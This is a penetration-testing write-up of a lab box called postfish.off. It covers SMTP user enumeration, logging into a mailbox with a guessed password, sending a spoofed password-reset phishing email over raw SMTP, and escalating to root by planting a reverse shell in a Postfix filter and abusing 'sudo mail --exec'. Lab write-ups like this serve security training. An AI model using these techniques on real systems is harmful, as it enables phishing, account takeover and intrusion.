# Box: 192.168.119.137

---

## System Info
- **Hostname:** postfish.off  
- **IP:** 192.168.119.137  
- **OS/Tech:** Ubuntu (Dovecot, Postfix, Nginx)

---

## Credentials
- **User:** _to discover_  
- **Password:** _to discover_

---

## Service Enumeration (`nmap -sC -sV`)
| Port   | State | Service       | Version                                        |
| ------ | ----- | ------------- | ---------------------------------------------- |
| **22** | open  | ssh           | OpenSSH 8.2p1 Ubuntu 4ubuntu0.1                |
| **25** | open  | smtp          | Postfix ESMTP (Ubuntu)                         |
| **80** | open  | http          | nginx 1.10.3                                   |
| **110**| open  | pop3          | Dovecot pop3d (Ubuntu)                         |
| **143**| open  | imap          | Dovecot imapd (Ubuntu)                         |
| **993**| open  | ssl/imap      | Dovecot imapd (Ubuntu)                         |
| **995**| open  | ssl/pop3      | Dovecot pop3d (Ubuntu)                         |

---

## Observations
- **HTTP (80):** nginx default page; host alias `postfish.off` required in `/etc/hosts`.  
- **SMTP (25):** Postfix; banner shows `postfish.off`.  
- **POP3/IMAP:** No credentials yet; can connect but need valid mailbox.  
- **SSH (22):** no direct access.

---

## Exploitation

### 1. Enumerate mail users via SMTP
```bash
smtp-user-enum -M VRFY   -U /opt/SecLists/Usernames/Names/names.txt   -t postfish.off
```
```
bin exists
hr exists
irc exists
mail exists
man exists
root exists
sales exists
sys exists
```
- **Valid users:** `hr`, `sales` (likely employees).

### 2. Access `sales` mailbox via POP3
```bash
nc postfish.off 110
```
```text
+OK Dovecot ready.
USER sales
+OK
PASS sales
+OK Logged in.
LIST
+OK 1 messages:
1 683
.
RETR 1
... email content ...
```
- Found email from `it@postfish.off` about password resets.

### 3. Phish `brian.moore` via SMTP
```bash
nc postfish.off 25
HELO attacker.com
MAIL FROM:<it@postfish.off>
RCPT TO:<brian.moore@postfish.off>
DATA
Subject: Password Reset

Hi Brian,

Please follow this link to reset your password:
http://192.168.119.137/reset

Regards,
IT
.
QUIT
```
- Sent reset email; obtained new password for Brian.

### 4. SSH as `brian.moore`
```bash
ssh brian.moore@192.168.119.137
# use the reset password
```

---

## Privilege Escalation

### A) Find world‑readable files
Using `linpeas`:
```
Readable file belonging to root: /etc/postfix/disclaimer
```
- `disclaimer` is writable by Brian.

### B) Abuse mail filter
- Edit `/etc/postfix/disclaimer` to inject a reverse shell.
- Trigger an email to run the filter; catch shell as `filter` user.

### C) Sudo mail abuse
```bash
sudo -l
# filter user can run:
sudo mail --exec='!/bin/bash'
```
- Launch `sudo mail`; you get a root shell.

